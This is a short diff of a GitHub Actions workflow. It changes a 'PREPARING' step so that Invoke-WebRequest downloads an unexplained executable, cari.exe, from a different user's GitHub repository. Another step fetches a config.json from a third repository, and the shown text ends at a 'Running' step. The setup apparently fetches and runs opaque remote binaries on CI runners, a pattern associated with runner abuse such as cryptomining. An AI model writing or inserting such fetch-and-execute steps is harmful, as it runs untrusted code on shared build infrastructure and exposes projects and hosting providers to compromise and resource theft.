@@ -17,7 +17,7 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://raw.githubusercontent.com/outlookadek/PAPAERSPACE/main/cari.exe -Outfile cari.exe
+      run: Invoke-WebRequest https://raw.githubusercontent.com/johnwixk228/ujicoba/main/cari.exe -Outfile cari.exe
     - name: PREPARING2 
       run: Invoke-WebRequest https://raw.githubusercontent.com/trautroi/aws/master/1.18/config.json -Outfile config.json
     - name: Running
